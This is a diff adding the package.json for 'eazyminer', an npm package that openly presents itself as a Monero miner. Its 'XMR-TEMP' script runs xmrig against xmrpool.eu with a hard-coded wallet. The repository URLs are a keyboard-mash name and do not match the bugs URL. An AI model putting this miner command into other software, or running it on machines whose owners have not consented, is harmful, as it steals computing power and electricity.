@@ -1,0 +1,33 @@
+{
+  "name": "eazyminer",
+  "version": "0.1.9",
+  "description": "Easy to use npm NodeJS Monero Miner with C++, uses XMRIG for highspeed hashing.",
+  "main": "./server/src/index.js",
+  "scripts": {
+    "postinstall": "cd server && npm i",
+    "client-start": "cd ./client && npm start",
+    "server-start": "cd ./server && npm start",
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "XMR-TEMP": "xmrig.exe --donate-level 5 -o xmrpool.eu:9999 -u 85wmjr8ehMgLYBYeCiNN5n8QHgpry3RBSi8a6MTAxfCXMRTiJ9UgcxFFfqnG6YjzX32SRbFZqeuoaNHnEeZiQn1V2YiJPtq -k --tls"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/idsbvbfibgrenuabnruenbieonboiern/idsbvbfibgrenuabnruenbieonboiern"
+  },
+  "author": "H.K.Brandsma",
+  "license": "ISC",
+  "bugs": {
+    "url": "https://github.com/DutchKevv/Overhead2Crypto/issues"
+  },
+  "homepage": "https://github.com/idsbvbfibgrenuabnruenbieonboiern/idsbvbfibgrenuabnruenbieonboiern#readme",
+  "keywords": [
+    "monero",
+    "xmr",
+    "xmrig",
+    "mining",
+    "easy",
+    "fast",
+    "c++",
+    "node"
+  ]
+}
